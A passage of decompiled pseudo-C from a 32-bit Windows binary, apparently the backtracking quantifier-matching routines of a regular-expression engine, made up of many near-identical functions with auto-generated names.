    *ppcVar6 = pcVar1;
    ppcVar6[1] = param_1;
  }
  uVar3 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(pcVar4 + 0x10) = uVar3;
  return CONCAT31((int3)((uint)uVar3 >> 8),1);
}



uint __thiscall FUN_00410c52(void *this,int param_1)

{
  void *this_00;
  undefined4 uVar1;
  int iVar2;
  uint uVar3;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar2 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if (*(int *)(iVar2 + 4) != *(int *)((int)this + 0x10)) {
    this_00 = *(void **)((int)this + 8);
    *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this_00 + 4);
    uVar3 = FUN_0041445c(this_00,param_1,(char **)(param_1 + 8));
    if ((char)uVar3 != '\0') {
      *(int *)(iVar2 + 4) = *(int *)(iVar2 + 4) + 1;
      uVar1 = *(undefined4 *)((int)this + 4);
      *(undefined4 *)(param_1 + 0x10) = uVar1;
      return CONCAT31((int3)((uint)uVar1 >> 8),1);
    }
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_00410cc0(void *this,int param_1)

{
  void *this_00;
  undefined4 uVar1;
  int iVar2;
  uint uVar3;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar2 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if (*(int *)(iVar2 + 4) != *(int *)((int)this + 0x10)) {
    this_00 = *(void **)((int)this + 8);
    *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)((int)this_00 + 4);
    uVar3 = FUN_00414487(this_00,param_1,(char **)(param_1 + 8));
    if ((char)uVar3 != '\0') {
      *(int *)(iVar2 + 4) = *(int *)(iVar2 + 4) + 1;
      uVar1 = *(undefined4 *)((int)this + 4);
      *(undefined4 *)(param_1 + 0x10) = uVar1;
      return CONCAT31((int3)((uint)uVar1 >> 8),1);
    }
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_00410d2e(void *this,int *param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_004144ad(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_004144ad(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_00410dbd:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_00410dbd;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_00410dc6(void *this,int *param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_004144f4(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_004144f4(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_00410e57:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_00410e57;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_00410e60(void *this,int *param_1)

{
  char *pcVar1;
  void *pvVar2;
  int iVar3;
  int *piVar4;
  uint uVar5;
  char **ppcVar6;
  
  piVar4 = param_1;
  param_1 = (int *)0x0;
  pcVar1 = (char *)piVar4[2];
  ppcVar6 = (char **)(piVar4 + 2);
  if (*(int *)((int)this + 0x10) != 0) {
    pvVar2 = *(void **)((int)this + 8);
    piVar4[4] = *(int *)((int)pvVar2 + 4);
    uVar5 = FUN_004144ad(pvVar2,piVar4,ppcVar6);
    if ((char)uVar5 != '\0') {
      if (*ppcVar6 == pcVar1) {
        param_1 = *(int **)((int)this + 0xc);
      }
      else {
        param_1 = (int *)0x1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            pvVar2 = *(void **)((int)this + 8);
            piVar4[4] = *(int *)((int)pvVar2 + 4);
            uVar5 = FUN_004144ad(pvVar2,piVar4,ppcVar6);
            if ((char)uVar5 == '\0') break;
            param_1 = (int *)((int)param_1 + 1);
          } while (param_1 < *(int **)((int)this + 0x10));
        }
      }
    }
  }
  if (param_1 < *(int **)((int)this + 0xc)) {
    *ppcVar6 = pcVar1;
    uVar5 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    ppcVar6 = (char **)FUN_0040c014((void *)piVar4[8],8);
    if (ppcVar6 != (char **)0x0) {
      *ppcVar6 = pcVar1;
      ppcVar6[1] = (char *)param_1;
    }
    iVar3 = *(int *)((int)this + 4);
    piVar4[4] = iVar3;
    uVar5 = CONCAT31((int3)((uint)iVar3 >> 8),1);
  }
  return uVar5;
}



uint __thiscall FUN_00410f0b(void *this,int *param_1)

{
  char *pcVar1;
  void *pvVar2;
  int iVar3;
  int *piVar4;
  uint uVar5;
  char **ppcVar6;
  
  piVar4 = param_1;
  param_1 = (int *)0x0;
  pcVar1 = (char *)piVar4[2];
  ppcVar6 = (char **)(piVar4 + 2);
  if (*(int *)((int)this + 0x10) != 0) {
    pvVar2 = *(void **)((int)this + 8);
    piVar4[4] = *(int *)((int)pvVar2 + 4);
    uVar5 = FUN_004144f4(pvVar2,piVar4,ppcVar6);
    if ((char)uVar5 != '\0') {
      if (*ppcVar6 == pcVar1) {
        param_1 = *(int **)((int)this + 0xc);
      }
      else {
        param_1 = (int *)0x1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            pvVar2 = *(void **)((int)this + 8);
            piVar4[4] = *(int *)((int)pvVar2 + 4);
            uVar5 = FUN_004144f4(pvVar2,piVar4,ppcVar6);
            if ((char)uVar5 == '\0') break;
            param_1 = (int *)((int)param_1 + 1);
          } while (param_1 < *(int **)((int)this + 0x10));
        }
      }
    }
  }
  if (param_1 < *(int **)((int)this + 0xc)) {
    *ppcVar6 = pcVar1;
    uVar5 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    ppcVar6 = (char **)FUN_0040c014((void *)piVar4[8],8);
    if (ppcVar6 != (char **)0x0) {
      *ppcVar6 = pcVar1;
      ppcVar6[1] = (char *)param_1;
    }
    iVar3 = *(int *)((int)this + 4);
    piVar4[4] = iVar3;
    uVar5 = CONCAT31((int3)((uint)iVar3 >> 8),1);
  }
  return uVar5;
}



uint __thiscall FUN_00410fb6(void *this,int *param_1)

{
  int iVar1;
  uint uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(param_1[8]);
  if (*(int *)((int)this + 0xc) == *(int *)(iVar1 + 4)) {
    local_c = (void *)0x0;
    local_8 = (void *)0x0;
    FUN_0041473a((void *)param_1[8],&local_c);
    param_1[2] = (int)local_c;
    uVar2 = (uint)local_c & 0xffffff00;
  }
  else {
    *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + -1;
    FUN_0040e130(*(void **)((int)this + 8),param_1);
    iVar1 = *(int *)((int)this + 4);
    param_1[4] = iVar1;
    uVar2 = CONCAT31((int3)((uint)iVar1 >> 8),1);
  }
  return uVar2;
}



uint __thiscall FUN_00411010(void *this,int *param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_004144ad(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_004110af;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_004144ad(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_004110af;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_004144ad(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_004110af:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_004110b8(void *this,int *param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_004144f4(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_00411159;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_004144f4(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_00411159;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_004144f4(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_00411159:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_00411162(void *this,int *param_1)

{
  char *pcVar1;
  void *pvVar2;
  int iVar3;
  int *piVar4;
  char *pcVar5;
  char **ppcVar6;
  uint uVar7;
  
  piVar4 = param_1;
  param_1 = (int *)0x0;
  pcVar1 = (char *)piVar4[2];
  pvVar2 = *(void **)((int)this + 8);
  ppcVar6 = (char **)(piVar4 + 2);
  piVar4[4] = *(int *)((int)pvVar2 + 4);
  pcVar5 = (char *)FUN_004144ad(pvVar2,piVar4,ppcVar6);
  if ((char)pcVar5 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_0041120f:
      return (uint)pcVar5 & 0xffffff00;
    }
  }
  else if (*ppcVar6 == pcVar1) {
    param_1 = *(int **)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *ppcVar6 = pcVar1;
  }
  else {
    param_1 = (int *)0x1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        pvVar2 = *(void **)((int)this + 8);
        piVar4[4] = *(int *)((int)pvVar2 + 4);
        uVar7 = FUN_004144ad(pvVar2,piVar4,ppcVar6);
        if ((char)uVar7 == '\0') {
          *ppcVar6 = pcVar1;
          pcVar5 = pcVar1;
          goto LAB_0041120f;
        }
        param_1 = (int *)((int)param_1 + 1);
      } while (param_1 < *(int **)((int)this + 0xc));
    }
  }
  ppcVar6 = (char **)FUN_0040c014((void *)piVar4[8],8);
  if (ppcVar6 != (char **)0x0) {
    *ppcVar6 = pcVar1;
    ppcVar6[1] = (char *)param_1;
  }
  iVar3 = *(int *)((int)this + 4);
  piVar4[4] = iVar3;
  return CONCAT31((int3)((uint)iVar3 >> 8),1);
}



uint __thiscall FUN_00411213(void *this,int *param_1)

{
  char *pcVar1;
  void *pvVar2;
  int iVar3;
  int *piVar4;
  char *pcVar5;
  char **ppcVar6;
  uint uVar7;
  
  piVar4 = param_1;
  param_1 = (int *)0x0;
  pcVar1 = (char *)piVar4[2];
  pvVar2 = *(void **)((int)this + 8);
  ppcVar6 = (char **)(piVar4 + 2);
  piVar4[4] = *(int *)((int)pvVar2 + 4);
  pcVar5 = (char *)FUN_004144f4(pvVar2,piVar4,ppcVar6);
  if ((char)pcVar5 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_004112c0:
      return (uint)pcVar5 & 0xffffff00;
    }
  }
  else if (*ppcVar6 == pcVar1) {
    param_1 = *(int **)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *ppcVar6 = pcVar1;
  }
  else {
    param_1 = (int *)0x1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        pvVar2 = *(void **)((int)this + 8);
        piVar4[4] = *(int *)((int)pvVar2 + 4);
        uVar7 = FUN_004144f4(pvVar2,piVar4,ppcVar6);
        if ((char)uVar7 == '\0') {
          *ppcVar6 = pcVar1;
          pcVar5 = pcVar1;
          goto LAB_004112c0;
        }
        param_1 = (int *)((int)param_1 + 1);
      } while (param_1 < *(int **)((int)this + 0xc));
    }
  }
  ppcVar6 = (char **)FUN_0040c014((void *)piVar4[8],8);
  if (ppcVar6 != (char **)0x0) {
    *ppcVar6 = pcVar1;
    ppcVar6[1] = (char *)param_1;
  }
  iVar3 = *(int *)((int)this + 4);
  piVar4[4] = iVar3;
  return CONCAT31((int3)((uint)iVar3 >> 8),1);
}



uint __thiscall FUN_004112c4(void *this,int *param_1)

{
  void *this_00;
  int iVar1;
  uint uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(param_1[8]);
  if (*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) {
    this_00 = *(void **)((int)this + 8);
    param_1[4] = *(int *)((int)this_00 + 4);
    uVar2 = FUN_004144ad(this_00,param_1,(char **)(param_1 + 2));
    if ((char)uVar2 != '\0') {
      *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
      iVar1 = *(int *)((int)this + 4);
      param_1[4] = iVar1;
      return CONCAT31((int3)((uint)iVar1 >> 8),1);
    }
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a((void *)param_1[8],&local_c);
  param_1[2] = (int)local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_00411332(void *this,int *param_1)

{
  void *this_00;
  int iVar1;
  uint uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(param_1[8]);
  if (*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) {
    this_00 = *(void **)((int)this + 8);
    param_1[4] = *(int *)((int)this_00 + 4);
    uVar2 = FUN_004144f4(this_00,param_1,(char **)(param_1 + 2));
    if ((char)uVar2 != '\0') {
      *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
      iVar1 = *(int *)((int)this + 4);
      param_1[4] = iVar1;
      return CONCAT31((int3)((uint)iVar1 >> 8),1);
    }
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a((void *)param_1[8],&local_c);
  param_1[2] = (int)local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_004113a0(void *this,int *param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_00414534(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_00414534(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_0041142f:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_0041142f;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_00411438(void *this,int *param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_0041458a(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_0041458a(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_004114c9:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_004114c9;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_004114d2(void *this,int *param_1)

{
  char *pcVar1;
  void *pvVar2;
  int iVar3;
  int *piVar4;
  undefined4 uVar5;
  char **ppcVar6;
  uint uVar7;
  
  piVar4 = param_1;
  param_1 = (int *)0x0;
  pcVar1 = (char *)piVar4[2];
  ppcVar6 = (char **)(piVar4 + 2);
  if (*(int *)((int)this + 0x10) != 0) {
    pvVar2 = *(void **)((int)this + 8);
    piVar4[4] = *(int *)((int)pvVar2 + 4);
    uVar5 = FUN_00414534(pvVar2,piVar4,ppcVar6);
    if ((char)uVar5 != '\0') {
      if (*ppcVar6 == pcVar1) {
        param_1 = *(int **)((int)this + 0xc);
      }
      else {
        param_1 = (int *)0x1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            pvVar2 = *(void **)((int)this + 8);
            piVar4[4] = *(int *)((int)pvVar2 + 4);
            uVar5 = FUN_00414534(pvVar2,piVar4,ppcVar6);
            if ((char)uVar5 == '\0') break;
            param_1 = (int *)((int)param_1 + 1);
          } while (param_1 < *(int **)((int)this + 0x10));
        }
      }
    }
  }
  if (param_1 < *(int **)((int)this + 0xc)) {
    *ppcVar6 = pcVar1;
    uVar7 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    ppcVar6 = (char **)FUN_0040c014((void *)piVar4[8],8);
    if (ppcVar6 != (char **)0x0) {
      *ppcVar6 = pcVar1;
      ppcVar6[1] = (char *)param_1;
    }
    iVar3 = *(int *)((int)this + 4);
    piVar4[4] = iVar3;
    uVar7 = CONCAT31((int3)((uint)iVar3 >> 8),1);
  }
  return uVar7;
}



uint __thiscall FUN_0041157d(void *this,int *param_1)

{
  char *pcVar1;
  void *pvVar2;
  int iVar3;
  int *piVar4;
  undefined4 uVar5;
  char **ppcVar6;
  uint uVar7;
  
  piVar4 = param_1;
  param_1 = (int *)0x0;
  pcVar1 = (char *)piVar4[2];
  ppcVar6 = (char **)(piVar4 + 2);
  if (*(int *)((int)this + 0x10) != 0) {
    pvVar2 = *(void **)((int)this + 8);
    piVar4[4] = *(int *)((int)pvVar2 + 4);
    uVar5 = FUN_0041458a(pvVar2,piVar4,ppcVar6);
    if ((char)uVar5 != '\0') {
      if (*ppcVar6 == pcVar1) {
        param_1 = *(int **)((int)this + 0xc);
      }
      else {
        param_1 = (int *)0x1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            pvVar2 = *(void **)((int)this + 8);
            piVar4[4] = *(int *)((int)pvVar2 + 4);
            uVar5 = FUN_0041458a(pvVar2,piVar4,ppcVar6);
            if ((char)uVar5 == '\0') break;
            param_1 = (int *)((int)param_1 + 1);
          } while (param_1 < *(int **)((int)this + 0x10));
        }
      }
    }
  }
  if (param_1 < *(int **)((int)this + 0xc)) {
    *ppcVar6 = pcVar1;
    uVar7 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    ppcVar6 = (char **)FUN_0040c014((void *)piVar4[8],8);
    if (ppcVar6 != (char **)0x0) {
      *ppcVar6 = pcVar1;
      ppcVar6[1] = (char *)param_1;
    }
    iVar3 = *(int *)((int)this + 4);
    piVar4[4] = iVar3;
    uVar7 = CONCAT31((int3)((uint)iVar3 >> 8),1);
  }
  return uVar7;
}



uint __thiscall FUN_00411628(void *this,int *param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_00414534(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_004116c7;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_00414534(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_004116c7;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_00414534(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_004116c7:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_004116d0(void *this,int *param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_0041458a(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_00411771;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_0041458a(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_00411771;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_0041458a(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_00411771:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_0041177a(void *this,int *param_1)

{
  char *pcVar1;
  void *pvVar2;
  int iVar3;
  int *piVar4;
  char *pcVar5;
  char **ppcVar6;
  undefined4 uVar7;
  
  piVar4 = param_1;
  param_1 = (int *)0x0;
  pcVar1 = (char *)piVar4[2];
  pvVar2 = *(void **)((int)this + 8);
  ppcVar6 = (char **)(piVar4 + 2);
  piVar4[4] = *(int *)((int)pvVar2 + 4);
  pcVar5 = (char *)FUN_00414534(pvVar2,piVar4,ppcVar6);
  if ((char)pcVar5 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_00411827:
      return (uint)pcVar5 & 0xffffff00;
    }
  }
  else if (*ppcVar6 == pcVar1) {
    param_1 = *(int **)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *ppcVar6 = pcVar1;
  }
  else {
    param_1 = (int *)0x1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        pvVar2 = *(void **)((int)this + 8);
        piVar4[4] = *(int *)((int)pvVar2 + 4);
        uVar7 = FUN_00414534(pvVar2,piVar4,ppcVar6);
        if ((char)uVar7 == '\0') {
          *ppcVar6 = pcVar1;
          pcVar5 = pcVar1;
          goto LAB_00411827;
        }
        param_1 = (int *)((int)param_1 + 1);
      } while (param_1 < *(int **)((int)this + 0xc));
    }
  }
  ppcVar6 = (char **)FUN_0040c014((void *)piVar4[8],8);
  if (ppcVar6 != (char **)0x0) {
    *ppcVar6 = pcVar1;
    ppcVar6[1] = (char *)param_1;
  }
  iVar3 = *(int *)((int)this + 4);
  piVar4[4] = iVar3;
  return CONCAT31((int3)((uint)iVar3 >> 8),1);
}



uint __thiscall FUN_0041182b(void *this,int *param_1)

{
  char *pcVar1;
  void *pvVar2;
  int iVar3;
  int *piVar4;
  char *pcVar5;
  char **ppcVar6;
  undefined4 uVar7;
  
  piVar4 = param_1;
  param_1 = (int *)0x0;
  pcVar1 = (char *)piVar4[2];
  pvVar2 = *(void **)((int)this + 8);
  ppcVar6 = (char **)(piVar4 + 2);
  piVar4[4] = *(int *)((int)pvVar2 + 4);
  pcVar5 = (char *)FUN_0041458a(pvVar2,piVar4,ppcVar6);
  if ((char)pcVar5 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_004118d8:
      return (uint)pcVar5 & 0xffffff00;
    }
  }
  else if (*ppcVar6 == pcVar1) {
    param_1 = *(int **)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *ppcVar6 = pcVar1;
  }
  else {
    param_1 = (int *)0x1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        pvVar2 = *(void **)((int)this + 8);
        piVar4[4] = *(int *)((int)pvVar2 + 4);
        uVar7 = FUN_0041458a(pvVar2,piVar4,ppcVar6);
        if ((char)uVar7 == '\0') {
          *ppcVar6 = pcVar1;
          pcVar5 = pcVar1;
          goto LAB_004118d8;
        }
        param_1 = (int *)((int)param_1 + 1);
      } while (param_1 < *(int **)((int)this + 0xc));
    }
  }
  ppcVar6 = (char **)FUN_0040c014((void *)piVar4[8],8);
  if (ppcVar6 != (char **)0x0) {
    *ppcVar6 = pcVar1;
    ppcVar6[1] = (char *)param_1;
  }
  iVar3 = *(int *)((int)this + 4);
  piVar4[4] = iVar3;
  return CONCAT31((int3)((uint)iVar3 >> 8),1);
}



uint __thiscall FUN_004118dc(void *this,int *param_1)

{
  void *this_00;
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(param_1[8]);
  if (*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) {
    this_00 = *(void **)((int)this + 8);
    param_1[4] = *(int *)((int)this_00 + 4);
    uVar2 = FUN_00414534(this_00,param_1,(char **)(param_1 + 2));
    if ((char)uVar2 != '\0') {
      *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
      iVar1 = *(int *)((int)this + 4);
      param_1[4] = iVar1;
      return CONCAT31((int3)((uint)iVar1 >> 8),1);
    }
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a((void *)param_1[8],&local_c);
  param_1[2] = (int)local_c;
  return (uint)local_c & 0xffffff00;
}



